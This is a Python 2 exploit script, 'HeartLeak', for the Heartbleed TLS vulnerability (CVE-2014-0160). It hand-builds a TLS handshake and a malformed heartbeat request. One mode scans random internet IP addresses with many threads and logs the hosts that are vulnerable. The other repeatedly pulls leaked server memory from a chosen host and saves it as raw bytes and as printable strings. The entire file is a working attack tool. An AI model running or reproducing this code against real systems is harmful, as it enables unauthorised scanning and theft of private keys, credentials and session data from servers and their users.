#!/usr/bin/env python27
#=========================================================#
# [+] Title: HeartLeak (CVE-2014-0160)                    #
# [+] Script: HeartLeak.py                                #
# [+] Twitter: https://twitter.com/OffensivePython        #
# [+] Blog: http://pytesting.blogspot.com                 #
#=========================================================#

import socket
import struct
import sys
import time
import random
import threading
from optparse import OptionParser

class heartleak(object):
    def __init__(self, host, port=443, verbose=False):
        try:
            self.sick=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sick.connect((host, port))
        except socket.error:
            return None
        self.hello="\x16\x03\x02\x00\xdc\x01\x00\x00\xd8\x03\x02\x53\x43\x5b\x90\x9d"
        self.hello+="\x9b\x72\x0b\xbc\x0c\xbc\x2b\x92\xa8\x48\x97\xcf\xbd\x39\x04\xcc"
        self.hello+="\x16\x0a\x85\x03\x90\x9f\x77\x04\x33\xd4\xde\x00\x00\x66\xc0\x14"
        self.hello+="\xc0\x0a\xc0\x22\xc0\x21\x00\x39\x00\x38\x00\x88\x00\x87\xc0\x0f"
        self.hello+="\xc0\x05\x00\x35\x00\x84\xc0\x12\xc0\x08\xc0\x1c\xc0\x1b\x00\x16"
        self.hello+="\x00\x13\xc0\x0d\xc0\x03\x00\x0a\xc0\x13\xc0\x09\xc0\x1f\xc0\x1e"
        self.hello+="\x00\x33\x00\x32\x00\x9a\x00\x99\x00\x45\x00\x44\xc0\x0e\xc0\x04"
        self.hello+="\x00\x2f\x00\x96\x00\x41\xc0\x11\xc0\x07\xc0\x0c\xc0\x02\x00\x05"
        self.hello+="\x00\x04\x00\x15\x00\x12\x00\x09\x00\x14\x00\x11\x00\x08\x00\x06"
        self.hello+="\x00\x03\x00\xff\x01\x00\x00\x49\x00\x0b\x00\x04\x03\x00\x01\x02"
        self.hello+="\x00\x0a\x00\x34\x00\x32\x00\x0e\x00\x0d\x00\x19\x00\x0b\x00\x0c"
        self.hello+="\x00\x18\x00\x09\x00\x0a\x00\x16\x00\x17\x00\x08\x00\x06\x00\x07"
        self.hello+="\x00\x14\x00\x15\x00\x04\x00\x05\x00\x12\x00\x13\x00\x01\x00\x02"
        self.hello+="\x00\x03\x00\x0f\x00\x10\x00\x11\x00\x23\x00\x00\x00\x0f\x00\x01"
        self.hello+="\x01"

        self.hb="\x18\x03\x02\x00\x03\x01\xFF\xEC"
        self.verbose=verbose

    def receive(self, op):
        data=''
        chunk=''
        typ, version, length = None, None, None
        try:
            data=self.sick.recv(5)
        except socket.error:
            return None, None, None
        
        if data:
            typ, version, length = struct.unpack('>BHH', data)
            if typ==None:
                return None, None, None
            else:
                if op==1: # handshake
                    data=self.sick.recv(length)
                else: # heartbeat
                    # recveive all data sent by the server
                    while True:
                        try:
                            chunk = self.sick.recv(0xFFFF)
                            data+=chunk
                        except socket.error: 
                            break
                return typ, version, data
        else:
            return None, None, None

    def handshake(self):
        
        self.sick.send(self.hello) # send handshake
        while True:
            if self.verbose:
                print("[+] Sending SSL Handshake")
            typ, version, payload = self.receive(1)
            if typ==None:
                if self.verbose:
                    print("[-] Host doesn't support OpenSSL")
                return None
            if typ==22 and ord(payload[0])==0x0E:
                if self.verbose:
                    print("[+] Received Hello back")
                # Received hello back
                break
        return True

    def heartbeat(self):
        if self.verbose:
            print("[+] Sending malicious heartbeat request")
        self.sick.send(self.hb)
        while True:
            typ, version, payload = self.receive(2)
            if typ==None or typ==21:
                return False
            if typ==24:
                if len(payload)>3:
                    return payload
                else:
                    return False

    def destroy(self):
        """ Close connection """
        if self.verbose:
            print("[+] Closing Connection")
        self.sick.close()

def leakTest(hFile, host, port=443):
    global n

    sick=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sick.connect((host, port))
        sick.close()
        print("[+] %s supports SSL, trying to trigger the bug"%host)
        target=heartleak(host)
        if target and target.handshake():
            if target.heartbeat():
                print("-{#}-- %s is vulnerable -{#}--"%host)
                if port==443:
                    hFile.write(host+'\r\n')
                else:
                    hFile.write(host+":"+port+'\r\n')
                n-=1
                if n>0:
                    print("[+] Still looking for %d vulnerable hosts"%n)
        target.destroy()
    except socket.error:
        sick.close()
        pass

def scan(nhost, port, nthread):
    hFile=open("heartleaked.log", "a")
    global n
    print("[+] Running a scan to find %d vulnerable host(s). Be patient!"%nhost)
    n=nhost
    while n>0:
        try:
            ip=randomHost()
            try:
                while threading.activeCount()>nthread:
                    time.sleep(5)
                t=threading.Thread(target=leakTest, args=(hFile, ip, port))
                t.start()
            except:
                time.sleep(5)
        except KeyboardInterrupt:
            print("[-] Cancelled due to keyboard interruption")
            break
    hFile.close()
    return

def getStrings(data):
    length=len(data)
    printable=''
    i=0
    while i<length:
        j=i
        while ord(data[j])>31 and ord(data[j])<127 and j<length-1:
            j+=1
        if j-i>3: # if found a string of 4 bytes or more
            printable+=data[i:j]+"\r\n"
            i=j
        else:
            i+=1
    return printable

def monitor(host, port):
    print("-{# Sniffing data from %s"%host)
    print("-{# Printable data will be stored in %s"%host+".txt")
    print("-{# Raw data will be stored in %s"%host+".bin")
    ascii=open(host+".txt", "a")
    binary=open(host+".bin", "wb")
    while True:
        target=heartleak(host, port, verbose=True)
        if target and target.handshake():
            try:
                leaked=target.heartbeat()
                binary.write(leaked)
                strings=getStrings(leaked)
                ascii.write(strings)
                print(strings)
                time.sleep(10)
            except KeyboardInterrupt:
                target.destroy()
                break
    ascii.close()
    binary.close()

def randomHost():
    """ Generates a random IP address """
    host=str(random.randint(0,255))
    host+="."+str(random.randint(0,255))
    host+="."+str(random.randint(0,255))
    host+="."+str(random.randint(0,255))
    return host

def main():

    usage="Usage: %prog arg [options]\n"
    usage+="Example:\n"
    usage+="       %prog monitor --server=example.com\n"
    usage+="       %prog scan --nhost=10 --threads=50\n"
    
    parser=OptionParser(usage)

    parser.add_option("-n", "--nhost", dest="nhost", type="int",
                      help="Number of Hosts", default=1)
    parser.add_option("-t", "--threads", dest="nthread", type="int",
                      help="Number of threads (Default: 10 threads)",
                      default=10)
    parser.add_option("-s", "--server", dest="host", type="string",
                      help="Target (IP Address) to monitor")
    parser.add_option("-p", "--port", dest="port", type="int",
                      help="Port number (default: 443)", default=443)

    options, args=parser.parse_args()
    socket.setdefaulttimeout(10)
    if len(args)>0:
        port=options.port
        if args[0]=="scan":
            nhost=options.nhost
            nthread=options.nthread
            scan(nhost, port, nthread)
        elif args[0]=="monitor" and options.host:
            host=options.host
            monitor(host, port)
        else:
            parser.print_help()
    else:
        parser.print_help()

if __name__=="__main__":
    main()
